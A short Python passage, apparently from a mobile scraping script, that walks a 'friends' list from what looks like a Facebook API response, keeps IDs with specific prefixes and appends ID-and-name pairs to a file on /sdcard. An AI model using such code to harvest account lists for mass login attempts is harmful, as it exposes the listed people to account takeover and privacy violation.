    try:
        qqq = ('/sdcard/' + save + '.json').replace(' ', '_')
        yss = open(qqq, 'a+')
        for a in z['friends']['data']:
            if a['id'][:6] in ('100079', '100080', ):
                id.append(a['id'] + '|' + a['name'])
                yss.write(a['id'] + '|' + a['name'] + '\n')

